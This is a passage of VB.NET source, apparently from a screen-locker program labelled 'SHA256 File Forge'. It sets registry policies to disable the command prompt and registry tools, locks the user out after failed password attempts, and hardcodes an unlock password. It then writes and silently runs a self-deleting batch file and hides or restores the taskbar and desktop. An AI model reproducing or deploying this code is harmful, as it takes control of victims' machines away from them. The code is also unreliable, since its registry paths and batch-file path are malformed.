            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Policies\System\DisableCMD", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        'Disable Registry Tools
        If Registry.CurrentUser.OpenSubKey("SHA256 File Forge") Is Nothing Then
            My.Computer.Registry.CurrentUser.CreateSubKey("SHA256 File Forge") 'If doesn't exist, you would run your SubKey like I did on this line.
        Else
            'If SubKey does exist
            My.Computer.Registry.SetValue("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "SHA256 File Forge", 1, RegistryValueKind.DWord)
            My.Computer.Registry.CurrentUser.OpenSubKey("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", True).SetValue("SHA256 File Forge", 1, RegistryValueKind.DWord)
        End If
        Err.Clear()
ErrRevoke:
        On Error Resume Next
    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
        passSequence = 0
        Timer6.Enabled = True
    End Sub
#End Region

#Region "Button Password Login"
    Public Sub Bt_Click(sender As Object, e As EventArgs)
        If Timer6.Enabled = False Then
            If tx.Text = "iamtheone" = False Then
                passSequence += 1
                If passSequence = 3 Then
                    MsgBox("Try Again In 30 Minutes, If The Clock Doesn't Run Out...lol")
                    Timer6.Enabled = True
                End If
                If passSequence < 3 Then
                    MsgBox("Try Again, You Have used" & passSequence & "Of Your Attempts")
                End If
            End If
            If tx.Text = "iamtheone" = True Then
                MsgBox("You Have Successfully Destroyed This Program, You Made The Right Choice.")
                passSequence = 0
                On Error GoTo ErrSelfDestruct
                Dim strName As String = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) '"destruct.bat"
                Dim strPath As String = Path.Combine _
         (Directory.GetCurrentDirectory(), strName)
                Dim strExe As String = New _
         FileInfo(Application.ExecutablePath).Name
                Using swDestruct As New StreamWriter(strPath)
                    swDestruct.WriteLine("attrib """ & strExe & """" &
             " -a -s -r -h")
                    swDestruct.WriteLine(":Repeat")
                    swDestruct.WriteLine("del " & """" & strExe & """")
                    swDestruct.WriteLine("if exist """ & strExe & """" &
             " goto Repeat")
                    swDestruct.WriteLine("del """ & strName & """")
                    swDestruct.Close()
                End Using
                'Self-Destruct (The Program destroys itself when correct password is entered)
                Dim procDestruct As New Process()
                procDestruct.StartInfo.FileName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location)
                procDestruct.StartInfo.CreateNoWindow = True
                procDestruct.StartInfo.UseShellExecute = False
                procDestruct.Start()
                Close()
                Err.Clear()
ErrSelfDestruct:
                On Error Resume Next

                taskBar = FindWindow("Shell_traywnd", "")
                Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_SHOWWINDOW) 'This will "HIDE" your taskbar/// To bring back taskbar, simply change the end to: SWP_SHOWWINDOW///
                Dim hwnd As IntPtr
                hwnd = FindWindow(vbNullString, "Program Manager")
                If Not hwnd = 0 Then
                    ShowWindow(hwnd, SW_RESTORE) 'Type "RESTORE" to bring back///
                End If

            End If

        End If
        If Timer6.Enabled = True Then
            MsgBox("Access Denied, You are now locked out For 30 Minutes")
        End If
    End Sub
#End Region
End Class
